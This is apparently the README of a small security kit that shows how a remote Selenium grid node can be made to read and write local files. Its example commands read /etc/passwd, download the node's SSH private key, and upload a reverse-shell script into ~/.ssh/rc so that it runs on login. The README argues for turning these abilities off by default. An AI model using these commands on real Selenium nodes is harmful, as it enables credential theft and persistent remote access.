# selenium-node-takeover-kit
These examples are to demonstrate possible issues with Selenium’s current design and configuration.

When a Selenium test interacts with a remote web driver, it can do the same things a user interacting with a local browser can do on the remote selenium node. Namely reading local files
```bash
examples/selenium_node_cat.py -u http://selenium-hub.lan:4444/wd/hub -r /etc/passwd
examples/selenium_node_download.py -u http://selenium-hub.lan:4444/wd/hub -r ~/.ssh/id_rsa -l ./nodes_rsa
```

and writing local files
```bash
examples/selenium_node_upload.py -u http://selenium-hub.lan:4444/wd/hub -r ~/.ssh/rc -l ./reverse_shell.sh
```
in the context of the running service. I believe these abilities should be something that can be turned off, and turned off by default.
